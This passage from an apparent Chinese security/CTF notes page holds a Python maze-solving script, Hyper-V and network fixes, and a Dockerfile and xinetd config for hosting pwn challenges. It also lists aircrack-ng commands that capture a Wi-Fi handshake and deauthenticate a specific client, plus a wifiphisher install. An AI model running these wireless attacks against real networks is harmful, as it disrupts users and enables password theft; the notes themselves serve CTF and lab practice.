</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve_maze</span><span class="p">(</span><span class="n">mp</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#delta = [x,y,path]</span>
</span></span><span class="line"><span class="cl">    <span class="n">delta</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">],[</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">]</span>    <span class="c1">#操作数需要改</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">M</span><span class="p">,</span><span class="n">N</span> <span class="o">=</span> <span class="mi">5</span><span class="p">,</span><span class="mi">5</span> <span class="c1">#长和宽需要改</span>
</span></span><span class="line"><span class="cl">    <span class="n">st</span> <span class="o">=</span> <span class="n">mp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;*&#34;</span><span class="p">)</span> <span class="c1">#需要改起始位置</span>
</span></span><span class="line"><span class="cl">    <span class="n">ed</span> <span class="o">=</span> <span class="n">mp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;#&#34;</span><span class="p">)</span> <span class="c1">#终点位置</span>
</span></span><span class="line"><span class="cl">    <span class="n">ID</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span> <span class="n">y</span> <span class="o">*</span> <span class="n">M</span> <span class="o">+</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">    <span class="n">vis</span> <span class="o">=</span> <span class="p">[[</span><span class="kc">False</span><span class="p">]</span> <span class="o">*</span> <span class="n">M</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">dfs</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">cPath</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">nonlocal</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="n">M</span> <span class="ow">or</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">y</span> <span class="o">&gt;=</span> <span class="n">N</span> <span class="ow">or</span> <span class="n">vis</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">]</span> <span class="ow">or</span> <span class="n">mp</span><span class="p">[</span><span class="n">ID</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)]</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span><span class="c1"># 不可以走的路径</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ID</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span> <span class="o">==</span> <span class="n">ed</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">path</span> <span class="o">=</span> <span class="n">cPath</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="n">vis</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span><span class="c1"># 对应delta有几个操作数</span>
</span></span><span class="line"><span class="cl">            <span class="n">fl</span> <span class="o">=</span> <span class="n">dfs</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">delta</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">y</span> <span class="o">+</span> <span class="n">delta</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">cPath</span> <span class="o">+</span> <span class="n">delta</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">fl</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">vis</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="n">vis</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">dfs</span><span class="p">(</span><span class="n">st</span> <span class="o">%</span> <span class="n">M</span><span class="p">,</span><span class="n">st</span> <span class="o">//</span> <span class="n">M</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">mp</span> <span class="o">=</span> <span class="s2">&#34;*11110100001010000101111#&#34;</span> <span class="c1">#迷宫的数据</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">solve_maze</span><span class="p">(</span><span class="n">mp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hyper打开和关闭">hyper打开和关闭</h2>
<h3 id="打开">打开</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bcdedit /set hypervisorlaunchtype auto
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="关闭">关闭</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bcdedit /set hypervisorlaunchtype off
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="v8相关">v8相关</h2>
<p>fetch v8之后卡住不动</p>
<p>先执行<strong>gclinet</strong>然后再删除.gclient然后再fetch v8</p>
<h2 id="ens33网卡失效">ens33网卡失效</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo dhclient ens33
</span></span><span class="line"><span class="cl">ifconfig ens33 up
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="如果没有ifconfig">如果没有ifconfig</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">systemctl stop NetworkManager
</span></span><span class="line"><span class="cl">systemctl disable NetworkManager
</span></span><span class="line"><span class="cl">service network-manager restart
</span></span><span class="line"><span class="cl">sudo dhclient ens33
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="airodump-使用">airodump 使用</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo airmon-ng
</span></span><span class="line"><span class="cl">sudo airmon-ng start wlan0
</span></span><span class="line"><span class="cl">sudo airodump-ng wlan0mon
</span></span><span class="line"><span class="cl">sudo airodump-ng -c 11 --bssid 10:9F:4F:80:8A:EA -w hach wlan0mon
</span></span><span class="line"><span class="cl">sudo aireplay-ng -0 20 -a 10:9F:4F:80:8A:EA -c 58:8F:CF:84:7D:EE wlan0mon
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="wifi钓鱼">wifi钓鱼</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt install wifiphisher
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="出题相关">出题相关</h2>
<h3 id="awd">awd</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">service ctf
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">disable</span> <span class="o">=</span> no
</span></span><span class="line"><span class="cl">    <span class="nv">socket_type</span> <span class="o">=</span> stream
</span></span><span class="line"><span class="cl">    <span class="nv">protocol</span>    <span class="o">=</span> tcp
</span></span><span class="line"><span class="cl">    <span class="nv">flags</span>       <span class="o">=</span> REUSE
</span></span><span class="line"><span class="cl">    <span class="nb">wait</span>        <span class="o">=</span> no
</span></span><span class="line"><span class="cl">    <span class="nv">user</span>        <span class="o">=</span> root
</span></span><span class="line"><span class="cl">    <span class="nb">type</span>        <span class="o">=</span> UNLISTED
</span></span><span class="line"><span class="cl">    <span class="nv">cps</span>         <span class="o">=</span> <span class="m">65536</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">    <span class="nv">port</span>        <span class="o">=</span> <span class="m">9999</span>
</span></span><span class="line"><span class="cl">    <span class="nb">bind</span>        <span class="o">=</span> 0.0.0.0
</span></span><span class="line"><span class="cl">    <span class="nv">server</span>      <span class="o">=</span> /usr/sbin/chroot
</span></span><span class="line"><span class="cl">    <span class="c1"># replace helloworld to your program</span>
</span></span><span class="line"><span class="cl">    <span class="nv">server_args</span> <span class="o">=</span> --userspec<span class="o">=</span>pwnuser:pwnuser /home/ctf /challenge/main
</span></span><span class="line"><span class="cl">    <span class="nv">banner_fail</span> <span class="o">=</span> /etc/banner_fail
</span></span><span class="line"><span class="cl">    <span class="c1"># safety options</span>
</span></span><span class="line"><span class="cl">    <span class="nv">per_source</span>	<span class="o">=</span> <span class="m">5</span>
</span></span><span class="line"><span class="cl">    <span class="nv">rlimit_cpu</span>	<span class="o">=</span> <span class="m">20</span>
</span></span><span class="line"><span class="cl">    <span class="nv">rlimit_as</span>  <span class="o">=</span> 2500M
</span></span><span class="line"><span class="cl">    <span class="c1">#access_times = 2:00-9:00 12:00-24:00</span>
</span></span><span class="line"><span class="cl">    <span class="nv">kafel_rule</span> <span class="o">=</span> /etc/pwn.kafel
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a href="https://github.com/google/kafel" target="_blank" rel="noopener noreffer ">https://github.com/google/kafel</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> ubuntu:20.04</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c">#LABEL maintainer=&#34;d1ag0n@cyberpeace.cn&#34;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /opt</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> sed -i <span class="s2">&#34;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&#34;</span> /etc/apt/sources.list <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    sed -i <span class="s2">&#34;s/deb http:\/\/se/#/g&#34;</span> /etc/apt/sources.list <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    sed -i <span class="s2">&#34;s/deb-src http:\/\/se/#/g&#34;</span> /etc/apt/sources.list <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    apt-get update <span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENV</span> <span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
</span></span><span class="line"><span class="cl"><span class="k">RUN</span> apt-get install -y lib32z1 xinetd libc6-dev-mips64el-cross libc6-dev-arm64-cross qemu-user-static libc6-dev-armel-cross <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    openssh-server unzip make wget bison flex build-essential  curl python-dev libpcap-dev python2.7 libpython2.7 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    libc6-dbg inetutils-ping libreadline-dev <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="o">&amp;&amp;</span> rm -rf /var/lib/apt/lists/*<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./get-pip.py /opt/<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> python get-pip.py <span class="o">&amp;&amp;</span> rm -rf /opt/get-pip.py<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ADD</span> ./kafel-master.zip /opt/<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> unzip kafel-master.zip <span class="o">&amp;&amp;</span> rm kafel-master.zip <span class="o">&amp;&amp;</span> mv kafel-master kafel <span class="o">&amp;&amp;</span> <span class="nb">cd</span> kafel <span class="o">&amp;&amp;</span> make <span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./xinetd /usr/sbin/xinetd<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 开启ssh登录</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> rm -f /etc/service/sshd/down<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> sed -ri <span class="s1">&#39;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#39;</span> /etc/ssh/sshd_config <span class="o">&amp;&amp;</span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    sed -ri <span class="s1">&#39;s/#UseDNS\ no/UseDNS\ no/g&#39;</span> /etc/ssh/sshd_config <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    sed -ri <span class="s2">&#34;s/StrictModes yes/StrictModes no/g&#34;</span> /etc/ssh/sshd_config <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    sed -ri <span class="s2">&#34;s/UsePAM yes/UsePAM no/g&#34;</span> /etc/ssh/sshd_config<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 设置允许密码登录</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s1">&#39;PasswordAuthentication yes&#39;</span> &gt;&gt; /etc/ssh/sshd_config<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 设置只可公钥登录</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># RUN echo &#39;PasswordAuthentication no&#39; &gt;&gt; /etc/ssh/sshd_config</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c">## 安装抓包的flow_dumper.py所需依赖</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> pip install <span class="nv">dpkt</span><span class="o">==</span>1.8.8 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="nv">pcapy</span><span class="o">==</span>0.11.1 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="nv">impacket</span><span class="o">==</span>0.9.15 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="nv">supervisor</span><span class="o">==</span>3.3.1 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="nv">pyinotify</span><span class="o">==</span>0.9.6 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    requests <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="c1"># pwntools \</span>
</span></span><span class="line"><span class="cl">    -i https://pypi.tuna.tsinghua.edu.cn/simple<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 添加选手用户</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> groupadd ctf <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    useradd -g ctf ctf -m <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="nb">echo</span> <span class="s2">&#34;ctf:xxxxxxxx&#34;</span> <span class="p">|</span> chpasswd <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="nb">echo</span> <span class="s2">&#34;root:xxxxxxxx&#34;</span> <span class="p">|</span> chpasswd<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 添加题目用户</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> useradd pwnuser<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> echo_supervisord_conf &gt; /etc/supervisord.conf<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir /etc/supervisord.conf.d<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">&#34;[include]&#34;</span> &gt;&gt; /etc/supervisord.conf<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">&#34;files = /etc/supervisord.conf.d/*.ini&#34;</span> &gt;&gt; /etc/supervisord.conf<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./flow/flow_dumper.ini /etc/supervisord.conf.d<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./flow/flow_dumper.py /root<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./flow/container_mon.py /root<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 编译并设置赛题所属组和权限</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /home/ctf/challenge</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./bin /home/ctf/challenge<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chown -R root:ctf /home/ctf/challenge <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	chmod -R <span class="m">775</span> /home/ctf/challenge <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	mkdir /home/ctf/.ssh<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /home/ctf</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">&#34;ctf{this_is_a_sample_flag}&#34;</span> &gt; /home/ctf/flag<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod <span class="m">644</span> /home/ctf/flag <span class="o">&amp;&amp;</span> chown root:root /home/ctf<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># RUN cp -R /lib* /home/ctf</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> cp -R /usr/lib* /home/ctf<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir /home/ctf/dev <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	mknod /home/ctf/dev/null c <span class="m">1</span> <span class="m">3</span> <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	mknod /home/ctf/dev/zero c <span class="m">1</span> <span class="m">5</span> <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	mknod /home/ctf/dev/random c <span class="m">1</span> <span class="m">8</span> <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	mknod /home/ctf/dev/urandom c <span class="m">1</span> <span class="m">9</span> <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	chmod <span class="m">666</span> /home/ctf/dev/*<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir /home/ctf/bin <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	cp /bin/sh /home/ctf/bin <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	cp /bin/ls /home/ctf/bin <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	cp /bin/cat /home/ctf/bin<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./xinetd.cfg /etc/xinetd.d/ctf<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 搅屎测试的</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># COPY ./kill.cfg /etc/xinetd.d/testkill</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># COPY ./noalarm.cfg /etc/xinetd.d/noalarm</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">&#34;Blocked by ctf_xinetd&#34;</span> &gt; /etc/banner_fail<span class="err">
